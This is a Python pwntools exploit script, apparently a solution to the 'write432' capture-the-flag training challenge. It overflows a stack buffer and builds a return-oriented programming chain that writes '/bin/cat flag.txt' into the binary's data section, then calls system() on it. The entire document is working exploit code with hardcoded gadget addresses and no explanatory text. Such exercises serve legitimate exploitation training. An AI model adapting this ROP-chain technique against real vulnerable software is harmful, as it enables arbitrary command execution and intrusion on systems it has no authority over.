#!/usr/bin/env python

from pwn import *

p = process("./write432")

padding = "A"*44

pop_edi_ebp = p32(0x080486da)
mov_edi_ebp = p32(0x08048670)
data = 0x0804a028
call_system = p32(0x0804865a)

cmd_0 = "/bin"
cmd_1 = "/cat"
cmd_2 = " fla"
cmd_3 = "g.tx"
cmd_4 = "t\x00\x00\x00"

rop = [
    padding,
    pop_edi_ebp,
    p32(data),
    cmd_0,
    mov_edi_ebp,
    pop_edi_ebp,
    p32(data+4),
    cmd_1,
    mov_edi_ebp,
    pop_edi_ebp,
    p32(data + 8),
    cmd_2,
    mov_edi_ebp,
    pop_edi_ebp,
    p32(data+12),
    cmd_3,
    mov_edi_ebp,
    pop_edi_ebp,
    p32(data+16),
    cmd_4,
    mov_edi_ebp,
    call_system,
    p32(data)
]

pld = ''.join(rop)
print pld

p.recvuntil("> ")
p.sendline(pld)
print p.recvall()

